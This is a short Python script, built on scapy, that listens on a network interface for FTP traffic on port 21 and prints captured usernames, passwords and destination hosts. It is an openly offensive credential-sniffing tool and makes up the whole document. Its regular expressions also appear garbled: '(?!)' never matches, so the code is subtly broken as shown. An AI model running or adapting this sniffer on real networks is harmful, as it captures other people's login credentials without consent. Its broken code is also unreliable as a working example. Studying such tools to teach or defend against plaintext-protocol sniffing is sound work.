from scapy.all import *
from optparse import OptionParser

def ftpSniff(pkt):
    dest = pkt.getlayer(IP).dst
    raw = pkt.sprintf('%Raw.load%')
    user = re.findall('(?!)USER (.*)', raw)
    pswd = re.findall('(?!)PASS (.*)', raw)
    if user:
        print('[*] Detected FTP Login to ', str(dest))
        print('[+] User account: ', str(user[0]))
    elif pswd:
        print('[+] Password: ', str(pswd[0]))

def main():
    parser = OptionParser('usage %prog -i <interface>')
    parser.add_option('-i', dest = 'interface', type = 'string', help = 'Specify interface to listen on')
    (options, args) = parser.parse_args()
    if options.interface == None:
        (options, args) = parser.parse_args(["-h"])
    else:
        conf.iface = options.interface
    try:
        print('[*] Sniffing packets...')
        sniff(filter = 'tcp port 21', prn = ftpSniff)
    except KeyboardInterrupt:
        exit(0)

if __name__ == '__main__':
    main()
